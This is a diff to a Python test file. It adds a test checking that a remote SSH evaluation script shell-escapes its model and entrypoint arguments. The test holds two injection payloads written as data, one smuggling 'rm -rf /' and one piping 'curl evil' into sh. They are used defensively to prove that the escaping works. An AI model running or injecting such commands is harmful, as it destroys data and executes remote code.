@@ -39,9 +39,26 @@ def test_default_eval_entrypoint_is_the_three_arm_eval():
 
 
 def test_live_passes_model_when_supplied():
-    args = L.parse_args(["--remote-mode", "live", "--model", "Qwen/Qwen2.5-7B-Instruct"])
+    import shlex
+    model = "Qwen/Qwen2.5-7B-Instruct"
+    args = L.parse_args(["--remote-mode", "live", "--model", model])
     script = L._remote_focus_script(args)
-    assert '--model "Qwen/Qwen2.5-7B-Instruct"' in script
+    # The model is shell-escaped (shlex.quote), mirroring tools/runpod_rlvr.py.
+    assert f"--model {shlex.quote(model)}" in script
+
+
+def test_dispatch_inputs_are_shell_escaped_no_injection():
+    # SECURITY: eval_entrypoint + model are interpolated into a bash script run over SSH;
+    # shlex.quote must neutralise shell metacharacters so a malicious dispatch value is a
+    # literal argument, never executed.
+    evil_model = 'foo"; rm -rf / #'
+    evil_entry = "tools/x.py; curl evil | sh"
+    args = L.parse_args(["--remote-mode", "live", "--model", evil_model,
+                         "--eval-entrypoint", evil_entry])
+    script = L._remote_focus_script(args)
+    # The raw injection payloads must NOT appear unquoted (they only appear shlex-quoted).
+    assert "; rm -rf / #" not in script.replace(__import__("shlex").quote(evil_model), "")
+    assert "; curl evil | sh" not in script.replace(__import__("shlex").quote(evil_entry), "")
 
 
 def test_dry_run_builds_payload_without_secret(capsys):
